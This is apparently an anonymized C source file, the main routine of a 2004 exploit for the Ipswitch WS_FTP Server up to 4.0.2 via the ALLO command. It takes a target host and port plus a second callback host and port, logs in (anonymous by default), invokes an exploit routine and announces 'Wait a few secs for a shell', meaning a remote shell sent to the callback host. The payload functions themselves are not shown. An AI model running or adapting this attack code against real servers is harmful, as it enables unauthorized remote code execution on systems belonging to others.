
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int (* exploit ) (unsigned long,unsigned short) ;int (* init ) (unsigned long,unsigned short,char const*,char const*) ;} ;
typedef TYPE_1__ xuser ;
typedef int WSADATA ;


 scalar_t__ FUNC_0 (int,int *) ;
 scalar_t__ FUNC_1 (char*) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (char*) ;
 unsigned long FUNC_4 (int ) ;
 int VAR_0 ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*,char*) ;
 int FUNC_7 (unsigned long,unsigned short,char const*,char const*) ;
 int FUNC_8 (unsigned long,unsigned short) ;

int FUNC_9(int VAR_1, char** VAR_2)
{
FUNC_3("Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit\n");
FUNC_3("(c)2004 Hugh Mann hughmann@hotmail.com\n");

WSADATA VAR_3;
if (FUNC_0(0x0202, &VAR_3))
return 1;

if (VAR_1 < 5)
FUNC_5(VAR_2[0]);

unsigned long VAR_4 = FUNC_4(FUNC_2(VAR_2[1]));
unsigned short VAR_5 = (unsigned short)FUNC_1(VAR_2[2]);
unsigned long VAR_6 = FUNC_4(FUNC_2(VAR_2[3]));
unsigned short VAR_7 = (unsigned short)FUNC_1(VAR_2[4]);
const char* VAR_8 = "anonymous";
const char* VAR_9 = "Hugh Mann";

for (int VAR_10 = 5; VAR_10 < VAR_1; VAR_10++)
{
if (!FUNC_6(VAR_2[VAR_10], "-u") && VAR_10 + 1 < VAR_1)
{
VAR_8 = VAR_2[++VAR_10];
}
else if (!FUNC_6(VAR_2[VAR_10], "-p") && VAR_10 + 1 < VAR_1)
{
VAR_9 = VAR_2[++VAR_10];
}
else if (!FUNC_6(VAR_2[VAR_10], "-a"))
{
VAR_0 = 1;
}
else
FUNC_5(VAR_2[0]);
}

if (!VAR_4 || !VAR_5 || !VAR_6 || !VAR_7)
FUNC_5(VAR_2[0]);

xuser VAR_11;
if (!VAR_11.init(VAR_4, VAR_5, VAR_8, VAR_9))
return 0;

if (!VAR_11.exploit(VAR_6, VAR_7))
FUNC_3("[-] u n33d t0 s7uddy m0r3...\n");
else
FUNC_3("[+] Wait a few secs for a shell\n");

return 0;
}
